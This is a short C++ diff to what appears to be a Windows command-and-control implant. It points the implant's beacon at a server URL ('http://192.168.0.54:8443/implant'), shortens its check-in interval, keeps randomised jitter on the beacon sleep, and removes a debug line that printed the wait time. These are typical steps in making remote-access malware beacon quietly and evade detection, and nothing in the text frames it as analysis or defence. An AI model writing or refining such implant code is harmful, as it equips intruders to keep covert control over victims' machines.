@@ -10,8 +10,8 @@
 #include <Windows.h>
 
 namespace implant {
-std::string url = "http://192.168.1.147:8443/test";
-const int baseWaitTime = 5000; // 5 second
+std::string url = "http://192.168.0.54:8443/implant";
+const int baseWaitTime = 500; //ms
 const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
 // Calculate the final wait time with jitter
 
@@ -48,8 +48,6 @@ std::string beaconLogic() {
             std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
             double jitter = distrib(gen);
             int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);
-
-            std::cout << "Wait time with jitter: " << waitTimeWithJitter << " milliseconds" << std::endl;
 
             // Sleep for the calculated time
             std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
